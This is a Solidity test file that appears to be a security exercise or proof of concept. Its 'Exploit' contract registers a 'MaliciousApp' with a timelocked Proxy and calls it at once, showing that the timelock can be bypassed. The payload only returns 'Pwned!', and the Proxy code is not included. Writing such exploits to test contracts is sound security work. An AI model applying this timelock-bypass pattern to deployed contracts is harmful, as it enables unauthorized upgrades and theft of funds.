// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import "./Proxy.sol";

contract MaliciousApp {
    function pwn() external pure returns (string memory) {
       return "Pwned!"; 
    }
}

contract Exploit {
    
    // Test exploit.
    function testExploit() public returns (string memory actualOutput) {
        // Create a proxy with a 5 day timelock.
        uint256 timelockDuration = 5 * 24 * 60 * 60;
        Proxy proxy = new Proxy(timelockDuration);
        
        // Register a malicious app
        proxy.register(MaliciousApp(0).pwn.selector, type(MaliciousApp).creationCode);
        
        
        //// NOW CALL APP IMMEDIATELY WITHOUT WAITING FOR TIMELOCK /////
        
        
        // Ensure can call registered app
        string memory expectedOutput = (new MaliciousApp()).pwn();
        actualOutput = MaliciousApp(address(proxy)).pwn();
        _assertEqual(expectedOutput, actualOutput, "testExploit() failed");
    }
    
    function _assertEqual(string memory a, string memory b, string memory message) internal pure {
        require(keccak256(bytes(a)) == keccak256(bytes(b)), message);
    }
}